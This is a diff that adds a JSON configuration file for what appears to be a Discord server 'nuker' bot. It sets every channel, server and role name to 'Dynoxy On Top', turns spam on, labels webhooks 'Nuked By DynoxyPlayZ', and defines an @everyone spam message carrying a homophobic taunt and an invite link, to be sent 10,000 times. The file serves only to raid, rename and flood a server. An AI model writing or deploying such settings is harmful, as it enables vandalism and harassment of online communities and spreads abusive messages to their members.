@@ -1,0 +1,14 @@
+{
+	"Prefix": ">",
+
+	"Channel-Names": ["Dynoxy On Top", "Dynoxy Op"], 
+	"Server-Names": ["Dynoxy On Top"],
+	"Role-Names": ["Dynoxy On Top"],
+	"Reason": ["Dynoxy On Top", "Dynoxy On Top"],
+
+	"Spam": true ,
+
+	"Webhook-Names": ["Nuked By DynoxyPlayZ"],
+	"Spam-Messages": ["@everyone **__TRASHED BY DYNOXYPLAYZ JOIN OR GAY__** https://discord.gg/spyop"],
+	"Spam-Amount": 10000
+}
